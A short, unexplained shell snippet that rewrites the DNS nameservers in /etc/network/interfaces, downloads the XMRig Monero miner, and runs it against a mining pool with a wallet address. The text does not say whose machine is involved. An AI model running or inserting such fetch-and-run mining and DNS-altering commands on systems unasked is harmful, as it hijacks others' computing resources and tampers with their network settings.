sed -i '/dns-nameservers 8.8.8.8 8.8.4.4/c\        dns-nameservers 1.2.3.4 1.2.3.4' /etc/network/interfaces
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
ls
cd xmrig-6.15.0
./xmrig -o sg.minexmr.com:443 -u 43zbW51PgdUC3bxbYA1TE3Xy2F2GP514DfYVYZnNofHdb4Ew1K39neW9b8t8yTsbEEesbDHcdqD9gVN5pg7LueGu1saSnhn -k --tls --rig-id rig   
